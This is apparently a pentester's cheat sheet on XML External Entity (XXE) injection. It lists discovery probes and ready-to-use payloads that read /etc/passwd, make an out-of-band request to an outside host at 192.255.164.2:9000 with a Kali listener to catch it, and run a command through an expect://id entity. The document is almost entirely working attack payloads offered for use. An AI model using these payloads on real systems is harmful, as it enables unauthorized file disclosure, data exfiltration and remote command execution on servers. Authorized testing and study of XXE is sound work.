# XXE

## Discovery
- Find ```xml``` in error of these payloads
  - ```.php?xml=>```
  - ```.php?xml=/>```

## Payloads
- ```<!DOCTYPE foo [<!Entity xxe SYSTEM "file:///etc/passwd">]> <foo>&xxe;</foo>```
- ```<!DOCTYPE data [<!ENTITY passwd SYSTEM "file:///etc/passwd">]> <data><text>&passwd;</text></data>```
- ```<!DOCTYPE data [<!ENTITY passwd SYSTEM "http://192.255.164.2:9000/helloworld">]> <data><text>&passwd;</text></data>```
  - Use ```python -m SimpleHTTPServer 9000``` to receive the connection log in KALI 
- ```<!Entity xxe SYSTEM "expect://id">]>```
